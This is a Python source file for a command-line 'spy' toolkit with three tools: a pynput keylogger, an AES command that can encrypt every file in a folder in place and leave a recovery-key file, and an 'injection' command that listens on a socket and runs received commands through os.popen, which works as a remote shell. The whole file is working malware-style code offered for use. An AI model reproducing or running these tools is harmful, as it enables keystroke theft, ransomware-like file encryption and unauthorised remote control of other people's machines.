import os
import click
import socket
import pyaes as pya
from datetime import datetime
from pynput.keyboard import Listener
from lash.Exportables.ikeyboard import *
from lash.Exportables.spyTools import *


@click.group('spy', help='Spy tools')
def spy():
    ...


@spy.command(help='Keylogger')
@click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
def keyboard(p):
    print('<running> f3 to stop')
    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    print(f'> Process Finished <')


@spy.command()
@click.argument('p', metavar='path', type=click.Path(exists=True), required=False, default='.')
@click.argument('key', metavar='<key>', type=click.STRING)
@click.option('-dc', is_flag=True, default=False, help='Decrypt file')
@click.option('-ex', is_flag=True, default=False, help='Export key to text file')
@click.option('-cl', is_flag=True, default=False, help='Crypt all files in a folder')
@click.option('-v', is_flag=True, default=False, help='Verbose mode')
def crypt(p, key, dc, ex, cl, v):
    """\b
    Encrypt/Decrypt files with AES algorithm

    \b
    Save the <key> you need her to decode
    The key NEED have 16 characters (128bits)
    \b
    Ex: crypt -ex ...\text.txt $kvzis1@7y602qsx
    """
    bkey = str.encode(key)  # Convert to bytes
    if p.find('\\') == -1 or p.find('/') == -1:
        fp = os.path.join('.', p)
    else:
        fp = p
    if dc:
        file = open(fp, 'rb')
        crip = pya.AESModeOfOperationCTR(bkey)
        data = crip.decrypt(file.read())
        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile decrypted successfully') if v else None
    else:
        if cl:
            try:
                os.chdir(fp)
            except:
                print(f'\nError the path {fp} is not valid!')
                return
            for root, folder, files in os.walk('.'):
                for file in files:
                    file_value = open(os.path.join(root, file), 'rb')
                    crip = pya.AESModeOfOperationCTR(bkey)
                    data = crip.encrypt(file_value.read())
                    file_value.close()
                    crypted = open(os.path.join(root, file), 'wb')
                    crypted.write(data)
        else:
            file = open(fp, 'rb')
            crip = pya.AESModeOfOperationCTR(bkey)
            data = crip.encrypt(file.read())
            file.close()
            crypted = open(fp, 'wb')
            crypted.write(data)
        if ex:
            if os.name == 'nt':
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                else:
                    pass
            else:
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                pass
            open('recovery-key.txt', 'w').write(key)
        print('\nFile(s) encrypted') if v else None


@spy.command(help='Command injection')
@click.option('-h', '-host', type=click.STRING, help='Host this machine for remote access, pass the port Ex: -h 8080')
@click.option('-c', '-connect', type=click.STRING, nargs=2, help='Connect to a host by it\' IP, port. Ex: -c 192.168.1.1 8080')
def injection(h, c):
    buffer = 1024 ** 2

    if h:
        host = socket.gethostbyname(socket.gethostname())
        port = port_verify(h)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...')
            s.listen()
            conn, addr = s.accept()
            s.setblocking(False)
            with conn:
                print(f'Client connected: {addr}')
                while conn:
                    actual_path = os.getcwd()
                    print('sending path')
                    conn.sendall(bytes(actual_path, 'utf-8'))
                    command = conn.recv(buffer).decode('utf-8').strip()
                    command_arg1 = command.strip().split()[0]
                    if not custom_server_manager(conn, buffer, os.getcwd(), command, command_arg1):
                        output = os.popen(command).read()
                        conn.send(bytes(output, 'utf-8'))
    elif c:
        host, port = c
        port = port_verify(port)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            print(injection_client_msg())
            while True:
                print('receiving path')
                path = s.recv(buffer).decode('utf-8')
                command = str(input(f'{host}\\{path}> ')).strip()
                command_arg1 = command.split()[0]
                if not custom_client_manager(s, buffer, os.getcwd(), command, command_arg1):
                    s.sendall(bytes(command, 'utf-8'))
                    print(s.recv(buffer).decode('utf-8'))
    else:
        print('Error: No option passed')

